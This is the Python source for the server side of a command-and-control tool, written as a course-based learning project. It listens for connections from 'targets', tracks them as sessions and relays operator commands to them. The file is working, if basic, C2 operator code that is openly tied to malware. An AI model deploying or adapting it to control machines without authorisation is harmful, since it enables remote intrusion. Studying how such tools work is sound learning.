###########################################################################################
# Author:      Seth J. Gibson
# Course:      Learn by Doing - Python3 Command and Control How To Guide, by Joe Helle
# Program:     Don't Fence Me In
# Description: This program is the server for a C2 I am writing in my free time, following
#                   the guidance of Joe Helle's C2 course. This is primarily a learning
#                   experience for building large-scale projects, along with developing an 
#                   understanding of C2 malware and a further understanding of Python 
#                   Socket applications.
# Theme Song:   https://www.youtube.com/watch?v=3abZal0fXCU&ab_channel=MichaelWyckoff
# Changelog:    Implemented multithreading for multiple client sessions
#               Implemented command values for user input
#               Reorganized handler functions to support multithreaded target sessions
#               Implemented 'background' function
###########################################################################################

import socket
import sys
import threading

buffer_size = 1024

def banner():
    print('\n██████╗  ██████╗ ███╗   ██╗████████╗    ███████╗███████╗███╗   ██╗ ██████╗███████╗    ███╗   ███╗███████╗    ██╗███╗   ██╗')
    print('██╔══██╗██╔═══██╗████╗  ██║╚══██╔══╝    ██╔════╝██╔════╝████╗  ██║██╔════╝██╔════╝    ████╗ ████║██╔════╝    ██║████╗  ██║')
    print('██║  ██║██║   ██║██╔██╗ ██║   ██║       █████╗  █████╗  ██╔██╗ ██║██║     █████╗      ██╔████╔██║█████╗      ██║██╔██╗ ██║')
    print('██║  ██║██║   ██║██║╚██╗██║   ██║       ██╔══╝  ██╔══╝  ██║╚██╗██║██║     ██╔══╝      ██║╚██╔╝██║██╔══╝      ██║██║╚██╗██║')
    print('██████╔╝╚██████╔╝██║ ╚████║   ██║       ██║     ███████╗██║ ╚████║╚██████╗███████╗    ██║ ╚═╝ ██║███████╗    ██║██║ ╚████║')
    print('╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝       ╚═╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝    ╚═╝     ╚═╝╚══════╝    ╚═╝╚═╝  ╚═══╝')
    print('                                                                                                    by Seth Gibson        ')

def comm_in(target_id):
    print('[+] Awaiting response...')
    response = target_id.recv(buffer_size).decode()
    return response

def comm_out(target_id, message):
    message = str(message)
    target_id.send(message.encode())

def listener_handler():
    sock.bind((host_ip, host_port))
    print('[+] Awaiting Connection from Client...')
    sock.listen()

    t1 = threading.Thread(target=comm_handler)
    t1.start()

def comm_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            targets.append([remote_target, remote_ip[0]])
            print(f'\n[+] Connection recieved from {remote_ip[0]}\n[>] Enter command #> ')
        except:
            pass

def target_comm(target_id):
    while True:
        message = input('[' + targets[selection][1] + ' >] Send message #> ')
        comm_out(target_id, message)

        if message == 'exit':
            target_id.send(message.encode())
            target_id.close()
            break
        if message == 'background':
            break
        else:
            response = comm_in(target_id)
            if response == 'exit':
                print('[' + targets[selection][1] + ' >] The client has terminated the session.')
                target_id.close()
                break
            print(response)

if __name__ == '__main__':
    targets = []
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        #host_ip = sys.argv[1]
        #host_port = int(sys.argv[2])
        host_ip = '127.0.0.1'
        host_port = 2222
        banner()
    #except IndexError:
    #    print('[-] Command line arguments are missing. Please try again.')
    except Exception as e:
        print(e)

    listener_handler()
    while True:
        try:
            cmd = input('[>] Enter command #> ')
            if cmd.split(" ")[0] == 'sessions':
                session_counter = 0
                if cmd.split(" ")[1] == '-l':
                    print('Session' + ' ' * 10 + 'Target')
                    for target in targets:
                        print(str(session_counter) + ' ' * 16 + target[1])
                        session_counter += 1
                if cmd.split(" ")[1] == '-i':
                    selection = int(cmd.split(" ")[2])
                    selection_id = (targets[selection])[0]
                    target_comm(selection_id)
        except KeyboardInterrupt:
            print('\n[-] Keyboard Interrupt issued. Exiting...')
            kill_flag = 1
            sock.close()
            break
